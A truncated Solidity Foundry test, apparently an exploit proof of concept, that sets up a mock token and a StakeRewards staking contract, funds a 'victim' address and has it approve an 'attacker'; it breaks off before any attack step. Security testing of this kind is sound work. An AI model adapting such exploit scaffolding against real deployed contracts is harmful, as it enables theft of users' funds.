contract ExploitTest is Test {
    MockToken public mockToken;
    StakeRewards public staking;
    address public victim = address(0x1234);
    address public attacker = address(0x5678);

    function setUp() public {
        mockToken = new MockToken();
        staking = new StakeRewards(mockToken, mockToken, 1);
        mockToken.mint(victim, 10000 * 10**18);
    }

    function test_exploit() public {
        // Victim approves attacker on MockToken directly
        vm.prank(victim);
        mockToken.approve(attacker, 10000 * 10**18);

